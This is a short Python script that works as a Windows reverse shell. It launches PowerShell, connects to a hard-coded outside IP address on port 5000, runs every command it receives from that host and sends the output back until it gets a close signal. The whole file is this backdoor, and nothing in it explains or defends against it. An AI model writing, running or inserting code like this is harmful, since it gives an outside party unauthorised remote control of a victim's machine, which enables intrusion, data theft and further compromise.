import sys

try:
    debug  = sys.argv[1] == "-d"
except:
    debug = False
if debug:print("----DEBUG-MODE------")
import socket
from subprocess import Popen, PIPE, STDOUT
from time import sleep 
HOST = "15.206.88.194"
PORT = 5000
def getOutput(file, timeInt = 0.5):
    while True:
        out = file.read()
        if out:
            return out
        else:
            sleep(timeInt)

proc = Popen("cmd /c powershell.exe> tempt.txt 2>&1", stdin = PIPE)
import time
time.sleep(1)

f = open("tempt.txt", "r")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send(getOutput(f).encode())
cmd = proc.stdin.write
run = proc.stdin.flush

while True:

    cmdr = s.recv(1024).decode()
    if "#CLOSE" in cmdr:
        
        if debug:print("killing process")
        proc.terminate()
        if debug:print("closing connection")
        s.close()
        break
    if debug:print(f"recieved {repr(cmdr)}")
    
    try:
        cmd(cmdr.encode())
        run()
        time.sleep(0.5)
        if debug:
            print(f"command was {f.read()}")
        else:
            f.read()
        cmd("\n".encode())
        run()
        out = getOutput(f)
        out = getOutput(f)
        #time.sleep(1)
        #if debug:print(repr(f.read(1)))
        #out = f.read()
        s.send(out.encode())
        if debug:print(f"sent {out}")
        
    except Exception as e:
        if debug:print(e)

